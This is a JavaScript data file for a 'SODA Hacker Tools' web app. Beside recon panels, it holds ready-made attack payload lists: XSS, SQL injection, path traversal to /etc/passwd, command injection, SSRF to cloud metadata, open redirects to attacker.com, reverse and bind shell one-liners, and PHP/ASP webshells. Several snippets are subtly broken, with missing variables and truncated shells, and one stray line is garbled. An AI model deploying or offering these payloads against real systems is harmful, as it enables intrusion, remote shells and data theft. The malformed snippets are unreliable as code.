// SODA Hacker Tools - Tool Data

const toolData = {
    ip: {
        title: 'IP Intelligence Tool',
        content: '<p>Enter IP address:</p><input type="text" id="ipInput" placeholder="192.168.1.1"><button onclick="runIPScan()">Scan</button><pre id="ipResult"></pre>'
    },
    whois: {
        title: 'Domain WHOIS Lookup',
        content: '<p>Enter domain:</p><input type="text" id="whoisInput" placeholder="example.com"><button onclick="runWhois()">Lookup</button><pre id="whoisResult"></pre>'
    },
    subdomain: {
        title: 'Subdomain Enumeration',
        content: '<p>Enter target domain:</p><input type="text" id="subdomainInput" placeholder="example.com"><button onclick="runSubdomain()">Enumerate</button><pre id="subdomainResult"></pre>'
    },
    dns: {
        title: 'DNS Records Dump',
        content: '<p>Enter domain:</p><input type="text" id="dnsInput" placeholder="example.com"><button onclick="runDNS()">Dump</button><pre id="dnsResult"></pre>'
    },
    xss: {
        title: 'XSS Payloads Collection',
        content: '<h4>Basic XSS:</h4><pre>&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;img src=x onerror=alert(1)&gt;\n&lt;svg onload=alert(1)&gt;</pre><h4>Filter Bypass:</h4><pre>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</pre>'
    },
    sqli: {
        title: 'SQL Injection Payloads',
        content: "<h4>Basic:</h4><pre>' OR '1'='1\n' OR 1=1--\n' UNION SELECT NULL--</pre><h4>Blind:</h4><pre>' AND SLEEP(5)--</pre>"
    },
    lfi: {
        title: 'LFI/RFI Payloads',
        content: '<h4>Path Traversal:</h4><pre>../../../etc/passwd\n..%2f..%2f..%2fetc/passwd</pre><h4>PHP Wrappers:</h4><pre>php://filter/convert.base64-encode/resource=index.php\nphp://input</pre>'
    },
    cmd: {
        title: 'Command Injection Payloads',
        content: '<h4>Linux:</h4><pre>; whoami\n| whoami\nwhoami\nvanx313\codexsandboxoffline</pre><h4>Windows:</h4><pre>| whoami\n& whoami\n&& whoami</pre>'
    },
    ssrf: {
        title: 'SSRF Payloads',
        content: '<h4>Cloud Metadata:</h4><pre>http://169.254.169.254/latest/meta-data/\nhttp://metadata.google.internal/</pre><h4>Internal:</h4><pre>http://127.0.0.1:80\nhttp://localhost:22</pre>'
    },
    openredir: {
        title: 'Open Redirect Payloads',
        content: '<h4>Basic:</h4><pre>//attacker.com\n///attacker.com\nhttps:attacker.com</pre>'
    },
    hashid: {
        title: 'Hash Identifier',
        content: '<p>Enter hash:</p><input type="text" id="hashInput" placeholder="5f4dcc3b5aa765d61d8327deb882cf99"><button onclick="identifyHash()">Identify</button><pre id="hashResult"></pre>'
    },
    hashcrack: {
        title: 'Hash Cracker',
        content: '<p>Enter hash:</p><input type="text" id="hashCrackInput" placeholder="Hash"><input type="text" id="hashType" placeholder="md5, sha1"><button onclick="crackHash()">Crack</button><pre id="hashCrackResult"></pre>'
    },
    jwt: {
        title: 'JWT Decoder',
        content: '<p>Enter JWT:</p><textarea id="jwtInput" rows="3" placeholder="eyJhbGci..."></textarea><button onclick="decodeJWT()">Decode</button><pre id="jwtResult"></pre>'
    },
    encode: {
        title: 'Multi Encoder',
        content: '<p>Enter text:</p><textarea id="encodeInput" rows="2"></textarea><select id="encodeType"><option value="base64">Base64</option><option value="url">URL</option><option value="hex">Hex</option><option value="rot13">ROT13</option></select><button onclick="encodeText()">Encode</button><pre id="encodeResult"></pre>'
    },
    decode: {
        title: 'Multi Decoder',
        content: '<p>Enter text:</p><textarea id="decodeInput" rows="2"></textarea><select id="decodeType"><option value="base64">Base64</option><option value="url">URL</option><option value="hex">Hex</option><option value="rot13">ROT13</option></select><button onclick="decodeText()">Decode</button><pre id="decodeResult"></pre>'
    },
    revshell: {
        title: 'Reverse Shell One-Liners',
        content: '<h4>Bash:</h4><pre>bash -i >& /dev/tcp/IP/PORT 0>&1</pre><h4>Python:</h4><pre>python -c "import socket,subprocess,os;s=socket.socket();s.connect((chr(73)+chr(80),PORT))"</pre><h4>PHP:</h4><pre>php -r "exec(\"/bin/sh -i\");"</pre><h4>PowerShell:</h4><pre> = New-Object System.Net.Sockets.TCPClient("IP",PORT)</pre>'
    },
    bindshell: {
        title: 'Bind Shell One-Liners',
        content: '<h4>Netcat:</h4><pre>nc -lvp PORT -e /bin/sh</pre><h4>Python:</h4><pre>python -c "import socket;s=socket.socket();s.bind((chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48),PORT))"</pre>'
    },
    webshell: {
        title: 'Mini Webshells',
        content: '<h4>PHP:</h4><pre>&lt;?php system(["cmd"]); ?&gt;\n&lt;?php eval(["x"]); ?&gt;</pre><h4>ASP:</h4><pre>&lt;%eval request("cmd")%&gt;</pre>'
    },
    cve: {
        title: 'CVE Database Lookup',
        content: '<p>Enter CVE ID:</p><input type="text" id="cveInput" placeholder="CVE-2024-0001"><button onclick="lookupCVE()">Lookup</button><pre id="cveResult"></pre>'
    },
    exploitdb: {
        title: 'Exploit-DB Search',
        content: '<p>Search:</p><input type="text" id="exploitInput" placeholder="Apache, WordPress"><button onclick="searchExploit()">Search</button><pre id="exploitResult"></pre>'
    },
    report: {
        title: 'Pentest Report Generator',
        content: '<p>Target:</p><input type="text" id="targetName" placeholder="Target"><textarea id="findingsInput" rows="3" placeholder="Findings"></textarea><button onclick="generateReport()">Generate</button><pre id="reportResult"></pre>'
    },
    bugbounty: {
        title: 'Bug Bounty Report Template',
        content: '<pre># Vulnerability Title\n\n## Summary\nBrief description\n\n## Steps to Reproduce\n1. Step 1\n2. Step 2\n\n## Proof of Concept\n[Screenshots/code]\n\n## Impact\nSecurity impact\n\n## Remediation\nFix recommendations</pre>'
    }
};
